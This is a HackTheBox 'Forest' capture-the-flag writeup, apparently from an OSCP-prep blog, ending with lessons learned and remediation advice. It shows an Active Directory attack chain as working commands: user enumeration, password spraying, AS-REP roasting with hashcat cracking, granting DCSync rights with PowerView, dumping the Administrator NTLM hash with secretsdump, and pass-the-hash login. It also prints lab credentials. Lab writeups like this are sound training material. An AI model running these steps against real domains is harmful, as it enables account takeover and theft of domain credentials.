---
layout: writeup
title: Forest - HackTheBox
date: 2024-10-14 13:32:20 +0300
description: A Writeup of the Forest Box from HackTheBox
image: # /assets/images/Forest/Forest.png
fig-caption: # Add figcaption (optional)
tags: [TJ Null, LainKusanagi, Windows, Active Directory, DCSync]
---

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called Forest, and it is rated Easy by the HackTheBox community. As usual, we get started with an nmap (`sudo nmap -A -sC -v -p- --open 192.168.227.38 -oN nmap`) which (gives more detail but) shows these open ports:

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

From checking `nxc smb 10.10.10.161 -u '' -p ''` we can see that the name is `FOREST` and the domain is `htb.local`. I see that there do not appear to be any web ports open, and I am unable to view anything through smb without authentication so I start to look around to see if I can get any other information through the other services. In particular we are able to get a ton of information with `enum4linux -a htb.local` (after adding the IP to the `/etc/hosts` file with an `htb.local` entry). I see a list of users:

```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[GenkaiChan] rid:[0x2969]
user:[zeus] rid:[0x296a]
user:[test2] rid:[0x296b]
```

We can quickly get a `users.txt` file by running `cat aboveList.txt | cut -d [ -f 2 | cut -d ] -f 1`. 

I start a `nxc winrm 10.10.10.161 -u users.txt -p users.txt` just in case to see if any of the users have their own username as the password, and run that in the background. I also use ldapsearch with blank credentials to see if I can find anything interesting in there. The full command is `ldapsearch -x -H ldap://10.10.10.161 -D 'CN=admin,DC=htb,DC=local' -W -b 'DC=HTB,DC=LOCAL' 'objectClass=*'` and we enter a blank password after. It gives a ton of output, too much to be useful, but it shows that we are able to get it without authenticating. At that point, is is worth to check if we can kerberoast or aspreproast. I am not able to enumerate SPNs for Kerberoasting, but I do find a user with Pre-Authentication disabled. 

![Forest2.png](/assets/images/Forest/Forest2.png){: .responsive-image}

I try to crack this password with hashcat: `hashcat -m 18200 svc-alfresco.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`. Eventually it cracks and we get: `svc-alfresco:s3rvice`. At this point, I see that the previous nxc command has stopped, and I see this: 

![Forest3.png](/assets/images/Forest/Forest3.png){: .responsive-image}

Interesting. I try to connect via winrm (`evil-winrm -i 10.10.10.161 -u 'GenkaiChan' -p 'GenkaiChan'`), and it works. I do the same with the `svc-alfresco` account, and it works as well. So I actually have two users, though I'm a little suspicious of the GenkaiChan account given that HTB does not uses unique boxes for each user. I can file that away for the moment. I grab the user.txt flag at `C:\Users\svc-alfresco\Desktop\flag.txt` and move on. 

At this point I ran through a few of the usual first enumeration steps - checking privileges and history, running winpeas and adPEAS, and checking for any interesting files, but I don't see anything that sticks out. It makes sense to run bloodhound here and see if I can find anything interesting. 

When I mark my user as owned and run "Reachable High Value Targets", I get this map. 

![Forest4.png](/assets/images/Forest/Forest4.png){: .responsive-image}

It is a little bit confusing because as I previously stated, I suspect the GenKaiChan user and possibly Test2 user are created by other student users on the machine. (For what it's worth, this is later confirmed.) This makes it kind of confusing, but the crucial part is that we are (transitive) members of the Account Operators group. The Account Operators group has GenericAll privileges on the Exchange Windows Permissions Group, which has WriteDACL Privileges on HTB.Local. 

![Forest5.png](/assets/images/Forest/Forest5.png){: .responsive-image}

What this means is that we can create a user, add it to the `Exchange Windows Permissions` group, and then use that user to perform a DCSync attack on the domain. The steps are as follows:
1. Create the user: `net user poppop '321!Password' /add /domain`
2. Add it to the "Exchange Windows Permissions" Group: `net group "Exchange Windows Permissions" poppop /add`
3. Grant it DCSync writes (Please note that this step requires the **PowerView module**):
	1. `$SecPassword = ConvertTo-SecureString '321!Password' -AsPlainText -Force`
	2. `$Cred = New-Object System.Management.Automation.PSCredential('htb.local\poppop', $SecPassword)`
	3. `Import-Module .\PowerView.ps1` - this must be transferred to the machine. 
	4. `Add-ObjectACL -PrincipalIdentity poppop -Credential $Cred -Rights DCSync` (**The Add-ObjectACL command is the step that requires PowerView.ps1 to have been imported**)

Then we can simply perform the DCSync attack remotely with our new user:
`impacket-secretsdump 'poppop:321!Password@10.10.10.161' -just-dc-user Administrator -just-dc-ntlm`

This will get us just the Administrator's NTLM hash, but it can be run without the `-just-dc-user Administrator` flag to get the other users. 

![Forest6.png](/assets/images/Forest/Forest6.png){: .responsive-image}

I did try cracking it, but no luck. It didn't actually matter though because we can simply run evil-winrm with the NTLM hash: `evil-winrm -i 10.10.10.161 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'`.

![Forest7.png](/assets/images/Forest/Forest7.png){: .responsive-image}

And boom, we get a shell, and we can grab the root flag on `C:\Users\Administrator\Desktop\root.txt`.

### Lessons Learned
In looking up other potential solutions for this box, I did see this bash script [here](https://sanaullahamankorai.medium.com/hackthebox-forest-walkthrough-2843a6386032): `for user in $(cat users.txt); do impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 $domain/${user} | grep -v Impacket; done`. I also got a little bit more familiar with bloodhound jut by needing to click around a little bit more to see how the chain of groups and permissions worked. 

One other thing I'd say is that this is my first HackTheBox writeup, and I'll be honest, I found the nature of the service confusing. I found another users credentials without realizing it, and I could have just completed the DCSync attack with them had I not guessed that's what was happening. So for me, that's something to keep an eye out for. 

### Remediation Steps
- Don't allow for ldap to be accessed without authentication.
- Require pre-authentication for the svc-alfresco account or it could be asreproasted. 
- Lock down the Exchange Windows Permissions Group, which has WriteDACL Privileges on HTB.Local. It's unclear which step definitely needs to be disabled without understanding the potential use case, but Service Accounts being members of IT Privileged Accounts being members of Account Operators being able to write anything to the Exchange Windows Permissions Group which has writeDACL permissions to the domain can't happen. 